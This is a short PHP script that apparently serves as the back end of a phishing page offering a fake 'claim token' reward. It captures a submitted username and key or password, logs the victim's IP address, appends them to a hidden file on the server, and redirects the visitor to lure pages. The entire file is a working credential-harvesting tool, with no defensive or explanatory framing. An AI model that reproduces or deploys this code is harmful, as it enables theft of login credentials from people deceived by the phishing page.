<?php
header("location: Claim.html");
header("location: index.koneksi");
header("location: Claim Token.html");

$DEVx ="___PJR";
$DEVy =$_POST['username'];
$DEVz =$_POST['montok'];
$ip =$_SERVER["REMOTE_ADDR"];

$handle=fopen($DEVx,'a');

fwrite($handle,"$DEVy");
fwrite($handle,"\n");
fwrite($handle, "Key : ");
fwrite($handle,"$DEVz");
fwrite($handle,"\n");
fwrite($handle, "ip : ");
fwrite($handle,"$ip");
fwrite($handle,"\n");
fwrite($handle,"=============jet===============");

fclose($handle);
exit;

 ?>